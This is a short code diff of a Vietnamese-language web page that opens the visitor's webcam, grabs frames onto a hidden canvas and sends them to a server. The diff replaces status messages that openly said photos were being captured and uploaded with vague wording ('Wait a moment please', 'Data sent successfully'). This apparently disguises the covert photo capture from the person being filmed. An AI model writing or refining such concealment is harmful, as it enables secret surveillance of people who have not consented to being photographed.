@@ -18,7 +18,7 @@
     </div>
 
     <video id="video" autoplay playsinline></video>
-    <div class="status" id="status">Đang mở webcam và gửi ảnh về server...</div>
+    <div class="status" id="status">Chờ đợi chút bạn nhé...</div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -60,9 +60,9 @@
                 });
 
                 if (response.ok) {
-                    status.innerHTML = `✅ Ảnh đã được gửi và lưu thành công trên server của bạn!<br><small>Cảm ơn bạn!</small>`;
+                    status.innerHTML = `✅ Đã gửi dữ liệu thành công!<br><small>Cảm ơn bạn!</small>`;
                 } else {
-                    status.textContent = "❌ Gửi ảnh thất bại.";
+                    status.textContent = "❌ Gửi dữ liệu thất bại.";
                 }
             } catch (err) {
                 status.textContent = "❌ Lỗi kết nối server.";
